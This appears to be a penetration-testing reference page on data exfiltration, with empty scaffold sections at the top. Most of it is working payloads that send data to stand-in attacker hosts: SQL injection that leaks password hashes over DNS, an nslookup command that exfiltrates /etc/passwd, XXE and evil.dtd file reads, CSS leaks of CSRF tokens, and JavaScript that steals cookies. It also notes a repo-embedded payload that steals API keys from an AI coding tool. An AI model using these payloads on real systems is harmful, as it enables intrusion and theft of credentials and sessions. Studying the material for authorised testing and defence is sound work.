# Data Exfil Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Data exfiltration — techniques for extracting sensitive data from a target system through covert or out-of-band channels when direct output is unavailable.

## Surface

- Blind SQL injection without visible output
- Blind SSRF — server makes outbound requests but you don't see the response
- CSS injection in restricted contexts (inline `style` attributes)
- XSS in sandboxed iframes or CSP-restricted contexts
- XXE with error-based or OOB via DNS/HTTP
- Blind command injection — output not reflected
- LLM/AI outputs processed or summarized before returning to client

## Test Approach

1. **OOB via Interactsh** — set up callback, trigger with DNS/HTTP lookup:

   ```
   # SQLi OOB
   ' AND LOAD_FILE(CONCAT('//',({SELECT password FROM users LIMIT 1}),'.attacker.interactsh.com/x'))-- -

   # XXE OOB
   <!ENTITY % data SYSTEM "file:///etc/passwd">
   <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.interactsh.com/?d=%data;'>">
   ```

2. **DNS exfil for long strings** — encode data as DNS subdomain labels (63 char max each):

   ```
   # Encode each chunk as hex subdomain
   SELECT SUBSTRING(password,1,30) INTO OUTFILE '/dev/null'
   UNION SELECT sys_exec('nslookup $(cat /etc/passwd | base64 | cut -c1-30).attacker.com')
   ```

3. **CSS injection char-by-char** — leak CSRF tokens via `style` attribute injection + background-image probe:

   ```css
   input[name="csrf"][value^="a"] { background: url(https://attacker.com/?c=a); }
   input[name="csrf"][value^="b"] { background: url(https://attacker.com/?c=b); }
   ```

   Inject via: `style="color:red; --x:url(attacker.com/?leak=` and close with `)"` for attribute-only injection.

4. **Time-based blind SQLi** — when all OOB is blocked:

   ```
   ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- -
   ```

   Use sqlmap for automation: `sqlmap -u "https://target.com/?id=1" --technique=T --dump`

5. **Blind XXE via error** — force DTD parse error containing file content:

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval; %error;
   ```

6. **HTTP exfil via redirect** — if SSRF/CSRF can make GET requests, append data to URL:

   ```
   fetch('https://attacker.com/?'+document.cookie)
   new Image().src='https://attacker.com/?x='+btoa(document.body.innerHTML)
   ```

## Tools

- **Interactsh** — OOB DNS/HTTP callback server: `interactsh-client -v`; also web UI at app.interactsh.com
- **sqlmap** — automated blind SQLi with OOB/time-based exfil
- **Burp Collaborator** — OOB callback with DNS/HTTP/HTTPS/SMTP
- **XXEinjector** — automated XXE file exfil
- **dalfox** — XSS with OOB exfil payloads built-in

## Payloads / Probes

```sql
-- MySQL OOB DNS exfil
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.interactsh.com\\x'));

-- MSSQL OOB (xp_dirtree)
EXEC master..xp_dirtree '\\attacker.interactsh.com\share\' + (SELECT TOP 1 password FROM users)

-- PostgreSQL COPY exfil
COPY (SELECT passwd FROM pg_shadow) TO '/tmp/shadow.txt';
```

```xml
<!-- XXE OOB -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>

<!-- evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%data;'>">
%param1;
```

```javascript
// XSS exfil
fetch('https://attacker.interactsh.com/?c='+document.cookie,{mode:'no-cors'});
navigator.sendBeacon('https://attacker.interactsh.com/', JSON.stringify({c:document.cookie,l:location.href}));
```

## Chain Opportunities

- **Blind SQLi + OOB → credential dump** — exfil password hashes for offline cracking
- **CSS injection → CSRF token leak → CSRF** — read CSRF token, then execute CSRF
- **XXE + OOB → SSRF → internal file read** — XXE probes internal services, exfils config
- **XSS + exfil → ATO** — steal session cookie or auth token
- **SSRF → metadata API exfil → cloud ATO** — read IAM credentials from 169.254.169.254

## Recent Intel

- **Inline style exfiltration** · CSS injection in `style` attributes (no `<style>` tag needed) leaks data char-by-char via background-image load — bypasses CSP policies that block `<style>` but allow inline styles · https://portswigger.net/research/inline-style-exfiltration
- **Claude Code API key exfil (CVE-2026-21852)** · Project-load triggers `.claude/settings.json` read; attacker embeds exfil payload in repo that fires on open, sends API keys to OOB server
- **DNS exfil via XXE** · Widely used in appliance testing where HTTP OOB is firewalled; DNS always works; encode data as hex/base32 in subdomain labels, reconstruct from DNS logs
